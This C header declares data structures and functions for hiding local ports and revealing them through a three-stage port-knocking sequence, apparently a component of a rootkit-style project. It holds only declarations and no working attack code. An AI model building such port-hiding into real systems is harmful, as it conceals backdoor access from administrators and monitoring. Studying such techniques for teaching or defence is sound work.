#ifndef _GROUP7_PORTHIDE_H
#define _GROUP7_PORTHIDE_H

#include "common.h"

typedef struct knock_list *knock_list_t_ptr;
typedef struct knock_list {
    ip_t ip;
    ip_version version;
    knock_list_t_ptr prev;
    knock_list_t_ptr next;
} knock_list_t;

extern knock_list_t ips_stage1;
extern knock_list_t ips_stage2;
extern knock_list_t ips_stage3;

extern knock_list_t_ptr ips_stage1_tail;
extern knock_list_t_ptr ips_stage2_tail;
extern knock_list_t_ptr ips_stage3_tail;

typedef unsigned lport_t;

typedef struct lport_list *lport_list_t_ptr;
typedef struct lport_list {
    lport_t lport;
    lport_list_t_ptr prev;
    lport_list_t_ptr next;
} lport_list_t;

extern lport_list_t hidden_lports;

void clear_lport_knocks(lport_list_t_ptr);
void clear_hidden_lports(void);

void hide_lports(void);
void unhide_lports(void);

void hide_lport(lport_t);
void unhide_lport(lport_t);

bool stage1_knock(lport_t);
bool stage2_knock(lport_t);
bool stage3_knock(lport_t);

bool list_contains_lport(lport_list_t_ptr, lport_t);
lport_list_t_ptr find_lport_in_list(lport_list_t_ptr, lport_t);
lport_list_t_ptr add_lport_to_list(lport_list_t_ptr, lport_t);
lport_list_t_ptr remove_lport_from_list(lport_list_t_ptr, lport_t);

bool list_contains_knock(knock_list_t_ptr, ip_t, ip_version);
knock_list_t_ptr find_knock_in_list(knock_list_t_ptr, ip_t, ip_version);
knock_list_t_ptr add_knock_to_list(knock_list_t_ptr *, ip_t, ip_version);
knock_list_t_ptr remove_knock_from_list(knock_list_t_ptr, knock_list_t_ptr *, ip_t, ip_version);

#endif //_GROUP7_PORTHIDE_H
